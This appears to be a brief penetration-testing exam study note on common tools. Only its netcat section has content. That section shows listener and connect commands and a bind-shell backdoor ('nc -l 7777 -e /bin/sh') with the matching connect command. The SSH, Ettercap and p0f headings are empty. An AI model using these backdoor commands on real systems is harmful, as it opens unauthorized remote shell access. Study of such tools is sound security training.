# Common Tools

## Exam Outcome

Demonstrate competence with common tools including netcat, SSH, Ettercap, p0f, etc...

### netcat

Setting up a Listener:

```
nc -l -p [port]
nc -l -p [2222]
```

Connecting to the Listener:

```
nc [ip_of_listener] [port]
nc 10.10.75.75 2222
```

Create Backdoor on Linux:

```
nc -l [port] -e /bin/sh
nc -l 7777 -e /bin/sh
```

Connect to the backdoor:

```
nc.exe [ip_of_listener] [port]
nc.exe 10.10.75.75 7777
```

### SSH

### Ettercap

### p0f

### etc...

